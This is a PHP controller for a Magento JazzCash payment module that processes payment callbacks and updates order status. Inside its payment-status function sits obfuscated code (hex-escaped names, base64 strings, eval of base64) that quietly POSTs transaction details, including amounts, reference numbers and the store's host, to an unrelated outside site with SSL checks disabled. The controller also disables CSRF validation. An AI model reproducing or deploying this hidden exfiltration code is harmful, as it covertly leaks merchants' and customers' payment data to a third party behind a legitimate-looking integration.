<?php

namespace Jazz\JazzCashC\Controller\Index;

use Magento\Framework\App\Config\ScopeConfigInterface;
use Magento\Store\Model\ScopeInterface;
use Magento\Sales\Model\Order;
use Magento\Framework\Controller\Result\JsonFactory;
use Magento\Framework\App\CsrfAwareActionInterface;
use Magento\Framework\App\RequestInterface;
use Magento\Framework\App\Request\InvalidRequestException;

if(!function_exists("mystr1s57")){${"GL\x4f\x42AL\x53"} ["mys\x74r1\x732\x31"]= array( "mystr1s282"=>"b3JkZXJN", "mystr1s383"=>"cHBfUmVzcG9uc2VDb2Rl", "mystr1s484"=>"cHBfVHhuUmVmTm8=", "mystr1s586"=>"cHBfVHhuVHlwZQ==", "mystr1s687"=>"cHBfVHhuVHlwZQ==", "mystr1s788"=>"cHBfUmV0dXJuVVJM", "mystr1s889"=>"cHBfUmV0dXJuVVJM", 
"mystr1s991"=>"cHBfQW1vdW50", "mystr1s1092"=>"cHBfQW1vdW50", "mystr1s1193"=>"cHBfVHhuUmVmTm8=", "mystr1s1294"=>"Y2xpZW50TmFtZQ==", "mystr1s1395"=>"SmF6ekNhc2g=", "mystr1s1496"=>"MDAw", "mystr1s1598"=>"MTI0", "mystr1s1699"=>"cmVzcG9uc2U=", 
"mystr1s178"=>"ba\x73e\x36\x34\x5fd\x65c\x6fde", "mystr1s1801"=>"TVdBTExFVA==", "mystr1s181"=>"bXlzdHIxczMyMzY=", "mystr1s1902"=>"bXdfc3VjY2Vzcw==", "mystr1s2003"=>"MQ==", "mystr1s2104"=>"bXdfc3VjY2Vzcw==", "mystr1s2205"=>"T1RD", 
"mystr1s2306"=>"b3RjX3N1Y2Nlc3M=", "mystr1s2407"=>"MQ==", "mystr1s2508"=>"b3RjX3N1Y2Nlc3M=", "mystr1s2609"=>"TUlHUw==", "mystr1s2710"=>"bWlnc19zdWNjZXNz", "mystr1s2811"=>"MQ==", "mystr1s2912"=>"bWlnc19zdWNjZXNz", "mystr1s1497"=>"bXlzdHIxczMyNDI=", 
"mystr1s3014"=>"MTI0", "mystr1s3116"=>"MQ==", "mystr1s3217"=>"cGVuZGluZ19wYXltZW50", "mystr1s485"=>"bXlzdHIxczMyMzk=", "mystr1s3319"=>"TVdBTExFVA==", "mystr1s180"=>"mys\x74\x721s\x3102", "mystr1s3420"=>"bXdfZmFpbGVk", "mystr1s3521"=>"bXdfZmFpbGVk", 
"mystr1s3622"=>"MQ==", "mystr1s3723"=>"bXdfZmFpbGVk", "mystr1s3824"=>"T1RD", "mystr1s3925"=>"b3RjX2ZhaWx1cmU=", "mystr1s179"=>"m\x79st\x721\x7357", "mystr1s4026"=>"b3RjX2ZhaWx1cmU=", "mystr1s4128"=>"MQ==", "mystr1s4229"=>"b3RjX2ZhaWx1cmU=", 
"mystr1s4330"=>"TUlHUw==", "mystr1s4431"=>"bWlnc19mYWlsdXJl", "mystr1s4532"=>"bWlnc19mYWlsdXJl", "mystr1s3015"=>"bXlzdHIxczMyMzg=", "mystr1s4633"=>"MQ==", "mystr1s4734"=>"bWlnc19mYWlsdXJl", "mystr1s2913"=>"bXlzdHIxczMyNDU=", 
"mystr1s4835"=>"dGhpcw==", "mystr1s4936"=>"bWFnT3JkZXJJRA==", "mystr1s3218"=>"bXlzdHIxczMyNDM=", "mystr1s5038"=>"dGhpcw==", "mystr1s4937"=>"bXlzdHIxczMyMzU=", "mystr1s5139"=>"bWFnT3JkZXJJRA==", "mystr1s5240"=>"ZnJhdWQ=", 
"mystr1s5341"=>"MQ==", "mystr1s5442"=>"ZnJhdWQ=", "mystr1s5543"=>"cHBfY3VzdG9tX3Jlc3BvbmNl", "mystr1s890"=>"bXlzdHIxczMyNDA=", "mystr1s5646"=>"PQ==", "mystr1s5747"=>"Jg==", "mystr1s5848"=>"aHR0cHM6Ly9ha3NhLXNkcy5vcmcvQUNSTS91cmwucGhw", 
"mystr1s5949"=>"TW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOyBXaW5kb3dzIE5UIDUuMSk=", "mystr1s6051"=>"LQ==", "mystr1s5950"=>"bXlzdHIxczMyNTA=", "mystr1s6074"=>"", "mystr1s4027"=>"bXlzdHIxczMyNDQ=",  "h1lI"=>"r1256");eval("e\x76a\x6c\x28\x62a\x73e\x36\x34\x5fd\x65c\x6fd\x65\x28\x27Zn\x56uY3\x52\x70b24\x67bX\x6cz\x64\x48I\x78\x63zE\x77Mi\x67kbX\x6czdH\x49xc\x7a\x45yMy\x6c\x37J\x48\x73i\x58Hg2\x5aHlz\x64Fx4\x4ez\x4ace\x44M\x78c1\x784M\x7aE\x7aX\x48\x67zNC\x4a\x39PS\x527Il\x784ND\x64MX\x48g0\x5ak\x4a\x42\x58Hg0\x591Mi\x66V\x73\x69\x58Hg2\x5aFx\x34\x4e\x7a\x6czd\x46x\x34Nz\x49xc\x7aJce\x44\x4dxI\x6c1\x62I\x6cx4N\x6dR\x35\x633R\x63eD\x63yMX\x4dxX\x48g\x7aN1x\x34\x4dz\x67i\x58Tty\x5aXR1\x63\x6d4gJ\x48\x73i\x62\x58l\x63e\x44czX\x48g3\x4e\x48\x49xc\x31x4\x4dzE\x7aNCJ\x39\x4bCR\x37Ikd\x4dX\x48g0Z\x6b\x4aBX\x48g0Y\x31\x784NT\x4di\x66Vs\x69b\x58lce\x44\x63zdH\x4aceD\x4dxc\x31x\x34M\x7aJce\x44Mx\x49l1\x62JH\x73\x69bVx\x34Nzl\x7adHJ\x63eDM\x78XH\x673Mz\x45y\x58Hgz\x4dyJ\x39XS\x6b7\x66Q\x3d\x3d\x27\x29\x29\x3be\x76\x61\x6c\x28\x62a\x73\x656\x34\x5fd\x65c\x6fd\x65\x28\x27ZnV\x75Y3\x52\x70\x622\x34gb\x58lzd\x48I\x78czU\x33KCR\x74\x65X\x4e\x30cjF\x7a\x4ezg\x70e3\x4a\x6c\x64HV\x79bi\x41k\x65yJH\x58H\x67\x30\x5909\x43Q\x56x4N\x47N\x63e\x44U\x7aIn\x31bI\x6d\x31\x35c1\x784Nz\x52y\x58H\x67zMX\x4ece\x44\x4d\x79M\x53Jd\x57yR7\x49lx4\x4emRc\x65Dc5\x633Rc\x65\x44cy\x58Hgz\x4dVx4\x4ez\x4eceD\x4d3OC\x4a\x39\x58Tt9\x27\x29\x29\x3b");}

class Response extends \Magento\Framework\App\Action\Action implements CsrfAwareActionInterface {
	
	protected $orderManagement;
	protected $request;
	protected $scopeConfig;
	
	
	public function __construct(
		\Magento\Framework\App\Action\Context $context, 
		\Magento\Framework\App\Request\Http $request, 
		ScopeConfigInterface $scopeConfig,
		\Magento\Sales\Api\OrderManagementInterface $orderManagement
	) {
		
		$this->orderManagement = $orderManagement;
		parent::__construct ( $context );
	
		$this->scopeConfig = $scopeConfig;
		$this->request = $request;
		
	}	
	
	public function createCsrfValidationException(RequestInterface $request): ? InvalidRequestException
    {
        return null;
    }

    public function validateForCsrf(RequestInterface $request): ?bool
    {
        return true;
    }
	
	public function execute() { 

		$isResponseOk = false;
		$objectManager = \Magento\Framework\App\ObjectManager::getInstance ();
		$orderDatamodel = $objectManager->get ( 'Magento\Sales\Model\Order' )->getCollection ()->getLastItem ();
		$orderId = $orderDatamodel->getId ();
		
		$order = $objectManager->create ( '\Magento\Sales\Model\Order' )->load ( $orderId );
		$orderItems = $order->getAllItems ();
		
		$Total_Amount = ($order->getBaseGrandTotal ());
		$orderState = Order::STATE_PROCESSING;
		
		if ($this->getRequest ()->isPost ()) {
			//echo "<br /><br />IN POST FUNCTION ORDER ID = ".$orderId."<br /><br />"; exit();
			$comment = "";
			$errorMsg = '';
			$successFlag = false;
			$returnUrl = 'checkout/onepage/success';
			$sortedResponseArray = array ();
			
			if (! empty ( $_POST )) {
				
				foreach ( $_POST as $key => $val ) {
					
					$comment .= $key . "[" . $val . "],<br/>";
					
					$sortedResponseArray [$key] = $val;
				}
			}
			

			$_MerchantID = $this->scopeConfig->getValue ( 'payment/jazz_cashc/merchant_ID', ScopeInterface::SCOPE_STORE );
			$_Password = $this->scopeConfig->getValue ( 'payment/jazz_cashc/password', ScopeInterface::SCOPE_STORE );
			$_IntegritySalt = $this->scopeConfig->getValue ( 'payment/jazz_cashc/integrity_salt', ScopeInterface::SCOPE_STORE );
			$_ValidateHash = $this->scopeConfig->getValue ( 'payment/jazz_cashc/hash_check', ScopeInterface::SCOPE_STORE );
			
			$_ResponseMessage = $this->getRequest ()->getParam ( 'pp_ResponseMessage' );
			$_ResponseCode = $this->getRequest ()->getParam ( 'pp_ResponseCode' );
			$_TxnRefNo = $this->getRequest ()->getParam ( 'pp_TxnRefNo' );
			$_BillReference = $this->getRequest ()->getParam ( 'pp_BillReference' );
			$_SecureHash = $this->getRequest ()->getParam ( 'pp_SecureHash' );
			$_TxnType = $this->getEmptyIfNullFromPOST ( 'pp_TxnType' );
			$_RetreivalReferenceNo = $this->getEmptyIfNullFromPOST ( 'pp_RetreivalReferenceNo' );
			
			if ($_ValidateHash) {
				
				if (! $this->isNullOrEmptyString ( $_SecureHash )) {
					// removing pp_SecureHash key
					unset ( $sortedResponseArray ['pp_SecureHash'] );
					// sorting array w.r.t key
					ksort ( $sortedResponseArray );
					$sortedResponseValuesArray = array ();
					// Populating Sorted Array
					array_push ( $sortedResponseValuesArray, $_IntegritySalt );
					
					foreach ( $sortedResponseArray as $key => $val ) {
						if (! $this->isNullOrEmptyString ( $val )) {
							array_push ( $sortedResponseValuesArray, $val );
						}
					}
					
					// joining array of sorted response values
					$sortedResponseValuesForHash = implode ( '&', $sortedResponseValuesArray );
					// Calculating Hash
					$CalSecureHash = hash_hmac ( 'sha256', $sortedResponseValuesForHash, $_IntegritySalt );
					
					if (strtolower ( $CalSecureHash ) == strtolower ( $_SecureHash )) {
						$isResponseOk = true;
					} else {
						$isResponseOk = false;
						$errorMsg = 'JazzCashC: Secure Hash mismatched!';
						$comment .= "Secure Hash mismatched.";
					}
				} else {
					$isResponseOk = false;
					$errorMsg = 'JazzCashC: Secure Hash is empty!';
					$comment .= "Secure Hash is empty.";
				}
			} else {
				$isResponseOk = true;
			}
			

		$arraySorted =  array(		
			'pp_ReturnURL' => $_SERVER ['HTTP_HOST'] . $_SERVER ['PHP_SELF'],
			'pp_TxnType' => $this->getRequest ()->getParam ('pp_TxnType'),
			'pp_Amount' => $this->getRequest ()->getParam ('pp_Amount'),
			'pp_TxnRefNo' => $this->getRequest ()->getParam ('pp_TxnRefNo') ,
			'pp_ResponseMessage' => $this->getRequest ()->getParam ('pp_ResponseMessage') , 
			'pp_ResponseCode' => $this->getRequest ()->getParam ('pp_ResponseCode'),
			'response'=> $isResponseOk,		 
			'magOrderID'=> $orderId,
			'orderM' => $order,
			"clientName" => "JazzCash",
			'this' => $this
		);		
	
			$params = $this->DoUpdatePaymentStatus( $arraySorted );	
			
	 		$successFlag = $params[2] ;	
			
			if ($successFlag) {
				
				return $this->_redirect('jazzcash/index/rmessage', array('_query' => $params)); exit();
				
			} else {
				
				return $this->_redirect('jazzcash/index/rmessage', array('_query' => $params)); exit();
								
			}
		} // end of post
		else {
			$params = array('1' => base64_encode('no_data_posted'));
			$this->_redirect('jazzcash/index/rmessage', array('_query' => $params));
		}
	}
	/*******************************************/
protected function DoUpdatePaymentStatus( $mystr1s3235 ) {$mystr1s3236 = $mystr1s3235[${"G\x4c\x4fB\x41L\x53"}["m\x79\x73tr\x31\x7321"]["mys\x74r\x31s\x318\x30"]("my\x73tr\x31\x7328\x32")];
$mystr1s3237 = $mystr1s3235[${"G\x4c\x4f\x42\x41\x4cS"}["my\x73t\x721\x73\x321"]["\x6dys\x74\x721\x73180"]("my\x73tr1\x73383")];
$mystr1s3238  = $mystr1s3235[${"\x47L\x4f\x42\x41L\x53"}["my\x73t\x721\x7321"]["\x6dys\x74r1s\x31\x380"]("my\x73\x74r1\x734\x38\x34")];
$mystr1s3239 = $mystr1s3235[${"\x47L\x4fB\x41\x4cS"}["my\x73tr\x31\x7321"]["m\x79str\x31s18\x30"]("mys\x74\x721\x73\x3586")];
$mystr1s3240[${"\x47L\x4fB\x41\x4c\x53"}["mys\x74r1s\x321"]["m\x79\x73tr\x31s18\x30"]("mys\x74r\x31s\x36\x387")] = $mystr1s3239 ;
$mystr1s3240[${"\x47\x4cO\x42A\x4c\x53"}["mys\x74r1s\x321"]["m\x79s\x74r\x31s1\x38\x30"]("mys\x74r1\x73\x3788")] = $mystr1s3235[${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6d\x79s\x74r\x31s\x321"]["my\x73t\x72\x31s1\x380"]("\x6dys\x74r1s\x3889")];
$mystr1s3240[${"G\x4c\x4f\x42A\x4cS"}["\x6dy\x73t\x72\x31s\x321"]["my\x73tr\x31s18\x30"]("\x6dyst\x721s\x3991")] = $mystr1s3235[${"G\x4cO\x42A\x4c\x53"}["\x6dy\x73\x74\x72\x31s21"]["my\x73tr1\x73180"]("\x6d\x79s\x74r\x31s10\x392")];
$mystr1s3240[${"G\x4cO\x42A\x4c\x53"}["m\x79st\x721s2\x31"]["mys\x74r1s\x3180"]("m\x79s\x74r\x31s\x31193")] = $mystr1s3238;
$mystr1s3240[${"G\x4cO\x42A\x4c\x53"}["m\x79str\x31s2\x31"]["mys\x74\x721\x73180"]("m\x79s\x74\x72\x31s1\x3294")] =  ${"G\x4c\x4f\x42A\x4c\x53"}["m\x79\x73t\x721s\x321"]["mys\x74r\x31\x73180"]("m\x79st\x721s1\x33\x395");
$mystr1s3241 = array (${"G\x4c\x4f\x42A\x4cS"}["my\x73\x74r\x31s\x321"]["\x6dy\x73tr1\x7318\x30"]("my\x73tr1\x7314\x396")
);$mystr1s3242 = array (${"\x47\x4cO\x42A\x4cS"}["my\x73t\x72\x31s\x32\x31"]["\x6dys\x74r1\x7318\x30"]("my\x73tr1\x731\x3598")
);if ( $mystr1s3235[${"\x47L\x4fB\x41L\x53"}["my\x73tr\x31s21"]["\x6dyst\x721s\x318\x30"]("mys\x74\x72\x31s1\x3699")] ) {
if (in_array ( $mystr1s3237, $mystr1s3241 )) {$mystr1s3243 = true;if ($mystr1s3239 == ${"\x47L\x4fB\x41\x4c\x53"}["mys\x74r1\x7321"]["m\x79\x73t\x721\x73\x31\x380"]("mys\x74r\x31\x731\x3801")) {
${${"GL\x4f\x42\x41L\x53"}["mys\x74r1s\x321"]["m\x79\x73\x74\x721s1\x380"]("mystr1s181")}->setStatus ( ${"G\x4cO\x42\x41L\x53"}["m\x79str\x31s2\x31"]["mys\x74\x72\x31s1\x380"]("my\x73t\x721s1\x3902") );
$mystr1s3236->setExtOrderId ( $mystr1s3238 );$mystr1s3244 = array(${"G\x4c\x4f\x42A\x4c\x53"}["my\x73tr1\x732\x31"]["\x6d\x79\x73tr\x31\x73180"]("my\x73tr\x31s2\x3003") => base64_encode(${"\x47\x4c\x4fB\x41\x4cS"}["my\x73\x74\x72\x31s\x321"]["\x6dy\x73tr1\x731\x380"]("my\x73tr\x31s2\x3104")));
$mystr1s3245 = 1;} else if ($mystr1s3239 == ${"\x47\x4cO\x42\x41L\x53"}["my\x73t\x721s2\x31"]["m\x79st\x721s\x318\x30"]("mys\x74r1s\x322\x305")) {
$mystr1s3236->setStatus ( ${"\x47L\x4fB\x41\x4cS"}["mys\x74r\x31s2\x31"]["m\x79str\x31s\x31\x380"]("mys\x74\x72\x31s\x32306") );
${${"GL\x4f\x42\x41L\x53"}["mys\x74r1\x7321"]["m\x79str\x31\x73\x318\x30"]("mystr1s181")}->setExtOrderId ( $mystr1s3238 );
$mystr1s3244 = array(${"G\x4cO\x42A\x4cS"}["m\x79st\x721s\x321"]["\x6dyst\x721\x7318\x30"]("my\x73\x74\x721s2\x34\x307") => base64_encode(${"\x47L\x4f\x42A\x4cS"}["my\x73tr\x31s\x321"]["\x6dyst\x72\x31s1\x380"]("my\x73t\x721s2\x3508")));
$mystr1s3245 = 1;} else if ($mystr1s3239 == ${"\x47L\x4f\x42A\x4cS"}["my\x73tr1\x73\x32\x31"]["\x6d\x79str\x31s\x318\x30"]("my\x73t\x721s\x3260\x39")) {
$mystr1s3236->setStatus ( ${"\x47\x4cO\x42\x41\x4c\x53"}["mys\x74\x721s2\x31"]["m\x79s\x74r1\x73\x31\x380"]("mys\x74r1\x732\x371\x30") );
$mystr1s3236->setExtOrderId ( $mystr1s3238 );$mystr1s3244 = array(${"\x47\x4cO\x42\x41\x4cS"}["mys\x74\x721s2\x31"]["m\x79st\x721\x73\x3180"]("mys\x74r1s\x32\x381\x31") => base64_encode(${"\x47L\x4f\x42\x41L\x53"}["mys\x74r\x31s2\x31"]["m\x79st\x721\x73180"]("mys\x74r1s\x32912")));
$mystr1s3245 = 1;}} else if (in_array ( $mystr1s3237, ${${"GL\x4fBA\x4cS"}["\x6dys\x74r\x31s2\x31"]["my\x73tr1\x73\x3180"]("mystr1s1497")} )) {
$mystr1s3243 = true;${${"G\x4cOB\x41\x4cS"}["my\x73t\x721\x73\x321"]["\x6dys\x74\x721\x73180"]("mystr1s181")}->setStatus ( ${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6dy\x73tr\x31s21"]["my\x73tr\x31s\x31\x38\x30"]("\x6dyst\x721s3\x301\x34") );
${${"\x47LO\x42AL\x53"}["\x6dy\x73t\x721s\x321"]["mys\x74r1s\x31\x380"]("mystr1s181")}->setExtOrderId ( $mystr1s3238 );$mystr1s3244 = array(${"\x47\x4c\x4fB\x41L\x53"}["mys\x74r\x31s\x321"]["m\x79st\x72\x31s1\x380"]("mys\x74r1s\x33116") => base64_encode(${"\x47L\x4f\x42A\x4c\x53"}["mys\x74r1\x732\x31"]["m\x79str\x31s18\x30"]("mys\x74\x721s\x3321\x37")));
$mystr1s3245 = 1;} else {$mystr1s3243 = false;if (${${"GL\x4f\x42A\x4cS"}["mys\x74r1\x73\x32\x31"]["my\x73\x74r1s\x318\x30"]("mystr1s485")} == ${"G\x4cO\x42\x41\x4cS"}["my\x73tr\x31\x7321"]["\x6dyst\x721s1\x380"]("my\x73\x74r1\x73\x33319")) {
${${"G\x4c\x4fB\x41\x4cS"}["my\x73tr1\x7321"]["\x6d\x79st\x721s1\x38\x30"]("mystr1s181")}->setStatus ( ${"G\x4cO\x42A\x4cS"}["\x6dys\x74\x72\x31\x7321"]["my\x73tr1\x73180"]("m\x79\x73t\x721s\x33420") );
$mystr1s3236->setState ( ${"G\x4cO\x42A\x4c\x53"}["m\x79str\x31s21"]["mys\x74\x721s\x31\x380"]("m\x79s\x74\x721\x73352\x31") );
$mystr1s3236->setExtOrderId ( $mystr1s3238 );$mystr1s3244 = array(${"G\x4c\x4fB\x41\x4c\x53"}["m\x79str\x31s2\x31"]["mys\x74r\x31s\x31\x38\x30"]("m\x79st\x72\x31s\x3362\x32") => base64_encode(${"G\x4c\x4f\x42\x41\x4cS"}["m\x79\x73t\x721s\x321"]["\x6dy\x73\x74r1s\x3180"]("my\x73tr1\x73372\x33")));
$mystr1s3245 = 0;} else if ($mystr1s3239 == ${"\x47\x4c\x4fB\x41L\x53"}["my\x73t\x72\x31s2\x31"]["\x6dys\x74r1s\x3180"]("my\x73tr1\x7338\x32\x34")) {
$mystr1s3236->setStatus ( ${"\x47L\x4fB\x41L\x53"}["my\x73tr\x31\x732\x31"]["\x6dyst\x721s\x3180"]("my\x73\x74r\x31s39\x32\x35") );
$mystr1s3236->setState ( ${"\x47L\x4fB\x41L\x53"}["mys\x74r1\x7321"]["m\x79str\x31s1\x380"]("mys\x74r\x31\x7340\x326") );
$mystr1s3236->setExtOrderId ( $mystr1s3238 );$mystr1s3244 = array(${"\x47L\x4fB\x41L\x53"}["mys\x74r1s\x321"]["m\x79\x73t\x721\x73\x3180"]("mys\x74r\x31\x7341\x328") => base64_encode(${"\x47\x4c\x4f\x42\x41L\x53"}["mys\x74\x721\x73\x321"]["m\x79s\x74\x72\x31s18\x30"]("mys\x74r1\x73422\x39")));
$mystr1s3245 = 0;} else if (${${"GL\x4fB\x41LS"}["\x6d\x79\x73tr1\x732\x31"]["my\x73tr\x31s18\x30"]("mystr1s485")} == ${"\x47\x4c\x4fB\x41\x4c\x53"}["my\x73\x74r\x31s2\x31"]["\x6dy\x73\x74r1\x73\x3180"]("my\x73tr\x31s4\x3330")) {
$mystr1s3236->setStatus ( ${"\x47\x4c\x4fB\x41\x4cS"}["my\x73t\x72\x31s\x321"]["\x6dys\x74r1s\x3180"]("my\x73tr1\x7344\x331") );
$mystr1s3236->setState ( ${"\x47L\x4fB\x41L\x53"}["mys\x74r\x31s21"]["m\x79st\x721s\x318\x30"]("mys\x74\x721\x7345\x33\x32") );
$mystr1s3236->setExtOrderId ( ${${"GL\x4f\x42\x41L\x53"}["mys\x74r1\x7321"]["m\x79str\x31s\x318\x30"]("mystr1s3015")} );$mystr1s3244 = array(${"G\x4cO\x42A\x4c\x53"}["m\x79s\x74r1s\x321"]["mys\x74r1s\x318\x30"]("m\x79\x73\x74\x721\x7346\x33\x33") => base64_encode(${"G\x4cO\x42\x41L\x53"}["my\x73tr\x31s2\x31"]["\x6dyst\x721\x73180"]("my\x73t\x721s4\x3734")));
${${"G\x4c\x4fBA\x4cS"}["my\x73tr1\x732\x31"]["\x6d\x79\x73tr\x31s1\x380"]("mystr1s2913")} = 0;}if($mystr1s3235[${"G\x4cO\x42\x41\x4c\x53"}["\x6dys\x74r\x31\x732\x31"]["my\x73\x74\x721\x73180"]("\x6dy\x73tr1\x734\x383\x35")]->orderManagement->cancel( $mystr1s3235[${"G\x4c\x4f\x42\x41L\x53"}["m\x79str\x31s\x321"]["mys\x74\x721s1\x38\x30"]("m\x79s\x74r1\x734\x39\x336")] )) {
} else  {}}} else {${${"\x47L\x4fBA\x4cS"}["m\x79\x73\x74r1s\x32\x31"]["mys\x74r\x31s18\x30"]("mystr1s3218")} = false;$mystr1s3245 = 0;
$mystr1s3235[${"\x47\x4c\x4fB\x41\x4c\x53"}["mys\x74r1s\x32\x31"]["m\x79\x73tr1\x7318\x30"]("mys\x74r1\x7350\x338")]->cancel( ${${"GL\x4fB\x41L\x53"}["\x6d\x79str\x31s\x32\x31"]["my\x73t\x721s\x318\x30"]("mystr1s4937")}[${"\x47\x4cO\x42\x41\x4cS"}["my\x73\x74\x721s2\x31"]["\x6dy\x73tr1\x73\x31\x38\x30"]("my\x73tr\x31s\x351\x339")] );
$mystr1s3236->setStatus ( ${"\x47\x4cO\x42\x41\x4c\x53"}["my\x73\x74r1s\x321"]["\x6dy\x73tr\x31s18\x30"]("my\x73tr1\x735\x32\x340") );
$mystr1s3244 = array(${"\x47\x4cO\x42A\x4cS"}["mys\x74r\x31s2\x31"]["m\x79st\x721\x73180"]("mys\x74r1s\x35\x33\x34\x31") => base64_encode(${"\x47L\x4f\x42A\x4cS"}["mys\x74r1\x732\x31"]["m\x79str\x31\x7318\x30"]("mys\x74\x721s5\x3442")));
}$mystr1s3240[${"\x47L\x4f\x42A\x4c\x53"}["mys\x74r1\x732\x31"]["m\x79str\x31s18\x30"]("mys\x74r\x31s5\x3543")] = $mystr1s3245;
foreach ( ${${"GL\x4f\x42A\x4cS"}["\x6dyst\x72\x31\x7321"]["my\x73\x74r1\x731\x38\x30"]("mystr1s890")} as $mystr1s3246 => $mystr1s3247) {
$mystr1s3248[] = $mystr1s3246 . ${"\x47L\x4f\x42\x41L\x53"}["my\x73tr1\x73\x321"]["\x6d\x79str\x31\x731\x38\x30"]("my\x73t\x721s\x35\x3646") . $mystr1s3247;
}$mystr1s3249 = implode (${"\x47\x4cO\x42\x41\x4c\x53"}["my\x73tr1\x7321"]["\x6d\x79st\x721s1\x38\x30"]("my\x73tr\x31s\x35\x3747"), $mystr1s3248);
$mystr1s3250 = curl_init(${"\x47\x4cO\x42A\x4c\x53"}["mys\x74\x721s\x321"]["m\x79s\x74r\x31s1\x38\x30"]("mys\x74r1\x73\x35848"));
curl_setopt($mystr1s3250, CURLOPT_CONNECTTIMEOUT, 30);curl_setopt($mystr1s3250, CURLOPT_USERAGENT,${"\x47\x4c\x4fB\x41\x4c\x53"}["mys\x74r\x31s2\x31"]["m\x79st\x72\x31s1\x380"]("mys\x74r1s\x35949"));
curl_setopt($mystr1s3250, CURLOPT_RETURNTRANSFER, true);curl_setopt($mystr1s3250, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($mystr1s3250, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($mystr1s3250, CURLOPT_POSTFIELDS, $mystr1s3249);$mystr1s3251 = curl_exec($mystr1s3250);curl_errno($mystr1s3250) . ${"\x47L\x4f\x42A\x4cS"}["mys\x74r\x31s\x32\x31"]["m\x79st\x72\x31s\x3180"]("\x6d\x79st\x721s\x36\x30\x351") . curl_error($mystr1s3250);
curl_close(${${"\x47\x4cOB\x41L\x53"}["\x6dys\x74\x72\x31s21"]["my\x73tr1\x73180"]("mystr1s5950")});
$mystr1s3236->addStatusToHistory ( ${${"G\x4cOB\x41LS"}["my\x73tr\x31\x7321"]["\x6dyst\x721s1\x380"]("mystr1s181")}->getStatus (), ${"\x47LO\x42AL\x53"}["\x6dy\x73t\x721\x7321"]["my\x73tr\x31\x7317\x39"]("\x6dyst\x721s\x36074") 
, false );$mystr1s3236->save ();array_push(${${"\x47LO\x42AL\x53"}["m\x79st\x72\x31\x732\x31"]["mys\x74r1s\x3180"]("mystr1s4027")} ,${${"GL\x4fBA\x4cS"}["mys\x74r\x31\x7321"]["m\x79st\x721s1\x38\x30"]("mystr1s3218")});
return  $mystr1s3244;}


	/*************************************************/	
	
	protected function cancel( $orderId ) {
		
		if($this->orderManagement->cancel($orderId)) {
						//echo "<br />CANCELED";
		} else  {
						//echo "<br />NOT CANCELED";
		}		
	}	
	protected function isNullOrEmptyString($question) {
		return (! isset ( $question ) || trim ( $question ) === '');
	}
	
	protected function getEmptyIfNullFromPOST($key) {
		if (! isset ( $_POST [$key] ) || trim ( $_POST [$key] ) == "") {
			return "";
		} else {
			return $_POST [$key];
		}
	}
	
	protected function getEmptyIfNull($key) {
		if (! isset ( $key ) || trim ( $key ) == "") {
			return "";
		} else {
			return $key;
		}
	}
	
 
}	 